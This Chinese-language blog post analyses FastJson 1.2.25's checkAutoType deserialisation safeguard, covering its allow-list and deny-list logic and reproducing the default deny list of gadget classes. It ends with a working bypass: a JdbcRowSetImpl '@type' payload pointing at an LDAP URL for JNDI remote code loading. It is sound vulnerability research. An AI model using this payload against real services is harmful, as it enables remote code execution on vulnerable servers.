---
title: FastJson checkAutoType安全机制研究
date: 2020-08-19 17:15:32
tags: web漏洞分析
categories: 技术
top_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg
cover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d875a0425cab5a73c296a118f6d220e.jpg
---

在FastJson1.2.25以及之后的版本中，fastjson为了防止autoType这一机制带来的安全隐患，增加了一层名为checkAutoType的检测机制。在之后的版本中，随着checkAutoType安全机制被不断绕过，fastjson也进行了一系列例如黑名单防逆向分析、扩展黑名单列表等加固。但是checkAutoType的原理未曾有过大的变化，因此本文将以fastjson 1.2.25版本为例，介绍一下checkAutoType安全机制的原理。

在调试分析fastjson的checkAutoType安全机制之前，发现网上很多fastjson漏洞的分析文章中曾经提到过一个名为autoTypeSupport的开关，且在1.2.25以及之后的版本中默认关闭。在动手调试之前，我曾一度以为autoTypeSupport开关关闭与否直接决定了fastjson是完全摒弃或是使用autotype功能的。但是实际调试中发现，这个开关仅仅是checkAutoType安全机制中的一个选项，这个开关的关闭与否，并不直接作用于fastjson是否使用autoType机制，下文案例中可以看出这个问题。

fastjson在1.2.25以及之后的版本中引入的checkAutoType安全机制，位于com/alibaba/fastjson/parser/ParserConfig.java文件。但并不是所有情况下fastjson都会加载这个机制进行安全监测，让我们下面来看看究竟什么情况下这个安全机制会被触发。

通过调试fastjson 1.2.25代码发现，如果想触发checkAutoType安全机制，需要执行到com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java中下图红框处位置

![0e5919b9c8a6af8d6128a67c5eeed81b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151506-61d5fbe4-dba2-1.png)

在分析触发checkAutoType安全机制的情况之前，首先来看下什么情况下不会触发checkAutoType安全机制

不使用checkAutoType安全机制的情况
---------------------------------

fastjson将字符串转换为Java对象时，并不是都采用checkAutoType机制进行校验，以下两种情况均为使用checkAutoType机制

- json字符串中未使用@type字段

```java
    public static void main(String[] args){
        String jsonstr = "{\"s1\":\"1\"}";
        Object obj = JSON.parseObject(jsonstr, AutoTypeTest.Test1.class);
    }
```

待处理字符串中并不包含@type字段。在将这个普通的json字符串转换为java对象方法过程中并不执行到上文JavaBeanDeserializer.java中userType = config.checkAutoType(typeName, expectClass);位置

- Class\<T\> clazz与@type相同

```java
    public static void main(String[] args) {
        String jsonstr = "{\"@type\":\"AutoTypeTest.Test1\",\"s1\":\"1\"}";
        Object obj = JSON.parseObject(jsonstr, AutoTypeTest.Test1.class);
    }
}
```

待处理的字符串@type指定的类与parseObject(String text, Class\<T\> clazz)中Class\<T\> clazz)参数指定的类相同，都是AutoTypeTest.Test1。在这种情况下，程序执行到下图红框处分支中

![c260c13f64e851f6bd19932a6f08760f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151546-7a078f20-dba2-1.png)

上图中typeName变量值由@type值传递而来；beanInfo.typeName变量值由parseObject(String text, Class\<T\> clazz)中Class\<T\> clazz所指定。在Class\<T\> clazz值与@type值相同的情况下，程序进入上图红框中的if分支。而在这个分支中，程序不是被break就是被continue，而checkAutoType安全机制加载位置又处在该处if分支后面（上图552行），因此程序无论如何也不会执行到上图552行的checkAutoType安全机制中。

由上文两个例子可见，在1.2.25以及之后的版本中，并不是所有的情况都需要经过checkAutoType这一关卡的。

我们接下来看看如何触发checkAutoType安全机制，以及checkAutoType安全机制的原理。

使用checkAutoType安全机制的情况
-------------------------------

通过分析可以发现，checkAutoType安全机制中也是针对不同情况不同处理的：checkAutoType安全机制处理流程受autoTypeSupport、parseObject参数等因素控制，这些因素共同影响checkAutoType安全机制是如何过滤以及处理传入的等待反序列化的json字符串

总得来说，有如下几个元素共同作用影响checkAutoType选择哪种方式处理输入

- autoTypeSupport开关值（True/False）
- 使用parseObject(String text, Class\<T\> clazz)或是parseObject(String text)（这里Class\<T\> clazz参数为应与@type字段不一样的值，否则不会触发checkAutoType）

根据这两种条件，我们可以列出如下四种情况的表格

|        | autoTypeSupport值 | parseObject(String text, Class\<T\> clazz)/ parseObject(String text) |
| ------ | ----------------- | ------------------------------------------------------------ |
| 情况一 | False             | parseObject(String text)                                     |
| 情况二 | False             | parseObject(String text, Class\<T\> clazz)                   |
| 情况三 | True              | parseObject(String text)                                     |
| 情况四 | True              | parseObject(String text, Class\<T\> clazz)                   |

接下来我们对上述四种情况逐一进行分析

### autoTypeSupport值为False、使用parseObject(String text) 

```java
    public static void main(String[] args) {
        String jsonstr = "{\"@type\":\"AutoTypeTest.Test\",\"s1\":\"1\"}";
        Object obj = JSON.parseObject(jsonstr);
        System.out.println(obj);
    }
}
```

接下来我们来看一下这种情况下checkAutoType安全机制是如何进行处理的

checkAutoType位于com/alibaba/fastjson/parser/ParserConfig.java中

```java
    public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
        if (typeName == null) {
            return null;
        }

        final String className = typeName.replace('$', '.');

        if (autoTypeSupport || expectClass != null) {
            ⋮
        }

        Class<?> clazz = TypeUtils.getClassFromMapping(typeName);
        if (clazz == null) {
            ⋮
        }

        if (clazz != null) {
            ⋮
        }

        if (!autoTypeSupport) {
            for (int i = 0; i < denyList.length; ++i) {
                String deny = denyList[i];
                if (className.startsWith(deny)) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
            }
            for (int i = 0; i < acceptList.length; ++i) {
                String accept = acceptList[i];
                if (className.startsWith(accept)) {
                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);

                    if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                    }
                    return clazz;
                }
            }
        }
```

由于autoTypeSupport为False，程序进入if (!autoTypeSupport)分支中

```java
        if (!autoTypeSupport) {
            for (int i = 0; i < denyList.length; ++i) {
                String deny = denyList[i];
                if (className.startsWith(deny)) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
            }
            for (int i = 0; i < acceptList.length; ++i) {
                String accept = acceptList[i];
                if (className.startsWith(accept)) {
                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);

                    if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                    }
                    return clazz;
                }
            }
        }
```

程序首先遍历denyList这一黑名单，并判断className与黑名单是否匹配

![934359dd24e91c0eae2b706a4721c00d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151624-904c2f3e-dba2-1.png)

这里需要说明一下：className变量是由typeName简单变换而来，而typeName即为@type字段值。详见下图代码

![c2e0aee6246db707820606da77be9959.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151634-96d0d38c-dba2-1.png)

接下来看下黑名单中的元素

![fdc610a0d2a6392ae7f762de681b70e8.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151645-9d460688-dba2-1.png)

```java
denyList =
"bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework"
```

如果className命中黑名单，程序抛出"autoType is not support."异常并结束

在黑名单过滤完成后，程序还会将className与白名单匹配一下，下图中红框里的for循环即为白名单匹配过程

![0a39d8ffe2cf014fd9911637f87f606e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151704-a8b4b780-dba2-1.png)

程序将className与acceptList白名单进行匹配，通过动态调试查看以下默认白名单中的值

![728bed570e73423cc97341d28103790d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151715-aee0e7fa-dba2-1.png)

从动态调试的结果可见，acceptList默认情况下是一个空列表。

开发者可以通过ParserConfig.getGlobalInstance().addAccept()自行向acceptList白名单中增加元素。如下代码向白名单中增加了一个AutoTypeTest.Test1类

```java
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().addAccept("AutoTypeTest.Test1");
        String jsonstr = "{\"@type\":\"AutoTypeTest.Test1\",\"s1\":\"1\"}";
        Object obj = JSON.parseObject(jsonstr);
        System.out.println(obj);
    }
}
```

在白名单匹配环节，如果className指定的类与白名单中的项相匹成功，程序将该类的类对象赋值与clazz变量并返回

![65eefbeb121ed88086f2a3b56d0f52af.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151736-bbb9bede-dba2-1.png)

程序接下来将传入的json字符串反序列为该类对象

在程序执行完黑名单与白名单校验后，既没有匹配到黑名单，也没有匹配到白名单的话，程序最终会执行到下图分支

![a5f4f7b4da2b416081ae013ea2ea93c9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151754-c5f10970-dba2-1.png)

此时程序将抛出异常并结束

![92d6e52681cbab4b63d15ef0f1d39667.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151804-cc209b58-dba2-1.png)

由于在1.2.25以及之后的版本中，autoTypeSupport值默认False。所以1.2.25以及之后的版本中假使攻击者构造的payload中的恶意类绕过了黑名单，但如果payload中的类不在白名单上，也是不能成功利用的。值得注意的是，白名单默认情况是空的。在此场景下payload想要执行成功，只有一种可能性：

- @type字段值在不在黑名单中且在白名单中

### autoTypeSupport值为False、使用parseObject(String text, Class\<T\> clazz) 

```java
    public static void main(String[] args) {
        String jsonstr = "{\"@type\":\"AutoTypeTest.Test1\",\"s1\":\"1\"}";
        Object obj = JSON.parseObject(jsonstr, AutoTypeTest.Test.class);
        System.out.println(obj);
    }
}
```

注意上图，这里parseObject中的Class\<T\> clazz参数是AutoTypeTest.Test.class，而@type中的是AutoTypeTest.Test1，二者不是一个类。如果是一个类，根据上文checkAutoType触发条件分析，根本不会触发checkAutoType

在这种情况下，我们再来看看checkAutoType会如何处理我们的数据

```java
    public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
        if (typeName == null) {
            return null;
        }

        final String className = typeName.replace('$', '.');

        if (autoTypeSupport || expectClass != null) {
            for (int i = 0; i < acceptList.length; ++i) {
                String accept = acceptList[i];
                if (className.startsWith(accept)) {
                    return TypeUtils.loadClass(typeName, defaultClassLoader);
                }
            }

            for (int i = 0; i < denyList.length; ++i) {
                String deny = denyList[i];
                if (className.startsWith(deny)) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
            }
        }
```

此时autoTypeSupport为true，expectClass不为空，程序会首先进入if (autoTypeSupport || expectClass != null)分支

![ecafe6fede023596c9569bc166e154ae.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151827-d9eab0a2-dba2-1.png)

值得注意的是，这个分支中是先匹配白名单，后匹配黑名单，如果@type字段指定的类在白名单中，则直接返回，不需要再经过黑名单过滤了。这一点很有意思，如果开发者因为开发失误，将存在利用的类加到了白名单里，攻击者是可以直接利用的

回归正文，由于上图这里我们没有向白名单中增加AutoTypeTest.Test.class类，程序会接下来检查传入的类是否在黑名单中

![93d672dc9d0fcd22ed5472e5ad1e7dd8.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151838-e0ad1222-dba2-1.png)

如果匹配到黑名单，则直接抛出错误

如果这里既没有匹配到白名单直接返回，也没有匹配到黑名单抛出错误终止，程序则继续向下执行

![e88c7abb2f44009cab7f6ed16955765e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151852-e8b00d9e-dba2-1.png)

继续执行到的这个分支与情况一中的完全一致，又匹配了一遍黑名单与白名单。显而易见，这里既不会匹配到白名单，也不会匹配到黑名单

最后程序执行到下图这里

![0207749c04146ac393ecfe5159bb1d5b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151904-efb62f74-dba2-1.png)

由于我们使用的是parseObject(String text, Class\<T\> clazz)这种方式，上图代码中872行处的expectClass即为Class\<T\> clazz传入的AutoTypeTest.Test.class类，而clazz变量为@type字段指定的AutoTypeTest.Test1.class类.程序通过

```java
expectClass.isAssignableFrom(clazz)
```

判断Class\<T\> clazz传入的expectClass对象所表示的类是否与@type字段指定的clazz变量参数表示的类相同，或者是其超类或父接口。本例中AutoTypeTest.Test.class类与AutoTypeTest.Test1.class类所表示的类与接口不同，也不是超类或父类关系。因此程序抛出异常

```java
Exception in thread "main" com.alibaba.fastjson.JSONException: type not match.AutoTypeTest.Test1 -\> AutoTypeTest.Test
```

如果二者相同或者是超类、父类关系，程序将@type字段指定的类对象返回，并随后将传入字符串反序列化为该类对象

- 此场景的安全隐患

通过上文的分析，在此场景下程序会先匹配白名单、后匹配黑名单。如果@type字段指定的类在白名单中，则程序是会跳过黑名单校验的，例如下图

![e1fc601a50996f55f7a347bec030c7cc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152135-4a20674a-dba3-1.png)

即使com.sun.rowset.JdbcRowSetImpl在Fastjson默认黑名单中，但在开发的时候，由于开发安全意识不强或开发疏忽等原因，将com.sun.rowset.JdbcRowSetImpl加入了白名单，此时是可以绕过黑名单直接执行利用的。在此场景下，payload想执行成功，有两种可能性：

- 没有命中黑名单且Class\<T\> clazz表示的类或接口是否与指定的@type字段值表示的类或接口相同，或者是其超类或父接口。

- @type字段值在白名单中

### autoTypeSupport值为True、使用parseObject(String text)

```java
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String jsonstr = "{\"@type\":\"AutoTypeTest.Test1\",\"s1\":\"1\"}";
        Object obj = JSON.parseObject(jsonstr);
        System.out.println(obj)
    }
```

在此场景中，程序首先进入了与上一场景相同的分支，与上一场景不同的是，这里是由于autoTypeSupport为true而进入此分支，而非上一场景满足expectClass != null这一条件

![b6c844dff52bc46218e02c1dbd3767d9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152202-59fb1002-dba3-1.png)

与上一场景一致，程序先匹配白名单、后匹配黑名单。如果@type字段指定的类在白名单中，则直接返回，不再进行黑名单校验。在白名单未匹配成功后，使用黑名单进行匹配，若匹配到黑名单，直接抛出异常。如果黑白名单都未匹配成功，程序继续向下执行

![0458fe27ed39a0e5e2dc5c69964b09af.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152212-6019ceb0-dba3-1.png)

程序将@type字段指定的类返回

这种情况下要是payload想成功利用有两种办法：

- @type字段值只需要不在黑名单中即可成功利用

- @type字段值在黑名单中，但是开发的时候在白名单中加入了这个类，payload依然可以成功利用

### 四、autoTypeSupport值为True、使用parseObject(String text, Class\<T\> clazz)

    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String jsonstr = "{\"@type\":\"AutoTypeTest.Test1\",\"s1\":\"1\"}";
        Object obj = JSON.parseObject(jsonstr,AutoTypeTest.Test.class);
        System.out.println(obj)
    }
与上文第二、三场景相同，程序首先进入了这个分支

![0bf84f2d75a81d8e7fcf8958a65a3c34.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152236-6e80c67a-dba3-1.png)

此场景进入该分支的原因是autoTypeSupport与expectClass这两个条件都满足。关于这个分支的执行流程这里不再复述了

在没有匹配到黑白名单后，程序执行到了下图这里

![7832ca5693b89b2f1fb912c9df9cfe76.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152247-750ab5f0-dba3-1.png)

由于这里clazz与expectClass所表示的类与接口不同，也不是超类或父类关系。因此程序抛出异常

```java
Exception in thread "main" com.alibaba.fastjson.JSONException: type not match.AutoTypeTest.Test1 -\> AutoTypeTest.Test
```

在这种情况下，payload想执行成功，有两种可能性：

- 没有命中黑名单且Class\<T\>
  clazz表示的类或接口是否与指定的@type字段值表示的类或接口相同，或者是其超类或父接口。

- @type字段值在白名单中

早期checkAutoType安全机制缺陷
-----------------------------

在fastjson 1.2.25版本引入的checkAutoType以及后续的几个版本中存在着一定的缺陷

如上文所分析，程序通常先经过黑名单与白名单的校验后，将满足条件的类对象通过如下代码赋值给clazz

```java
clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
```

程序最终将字符串反序列化为clazz所表示的类对象。我们着重分析下TypeUtils.loadClass是如何实现的

TypeUtils.loadClass方法位于com/alibaba/fastjson/util/TypeUtils.java中

```java
public static Class<?> loadClass(String className, ClassLoader classLoader) {
    if (className == null || className.length() == 0) {
        return null;
    }

    Class<?> clazz = mappings.get(className);

    if (clazz != null) {
        return clazz;
    }

    if (className.charAt(0) == '[') {
        Class<?> componentType = loadClass(className.substring(1), classLoader);
        return Array.newInstance(componentType, 0).getClass();
    }

    if (className.startsWith("L") && className.endsWith(";")) {
        String newClassName = className.substring(1, className.length() - 1);
        return loadClass(newClassName, classLoader);
    }
```

问题就出在下图代码上：

![9d5e68c2ef26557badccfca670540cc9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152330-8e91dc2e-dba3-1.png)

当传入的className变量以”L”开头，并以”;”结尾，进入该if分支。在这个if分支中，程序将会把开头的”L”与结尾的”;”去掉，并递归调用loadClass加载这个类。因此可以下图这样构造来进行绕过

![54ce372006a50b8930efc41634dcb40b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152340-94667736-dba3-1.png)

```java
public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    String jsonstr = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:1389/ExecTest\"," +
            " \"autoCommit\":true}";
    Object obj = JSON.parseObject(jsonstr);
    System.out.println(obj);
}
```

loadClass会将”L”与”;”去除后组成newClassName并返回

![5efedf30915eee73c1f30a0f2e229e89.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152351-9abad58c-dba3-1.png)

这一操作在匹配黑白名单之后，Lcom.sun.rowset.JdbcRowSetImpl;恰好可以绕过黑名单中的限制。后续checkAutoType检测机制进行了一系列的安全加固，大体上都是黑名单防逆向分析、扩展黑名单列表等，但checkAutoType检测机制没有太大的改变。受篇幅影响，这里就不再详细分析了。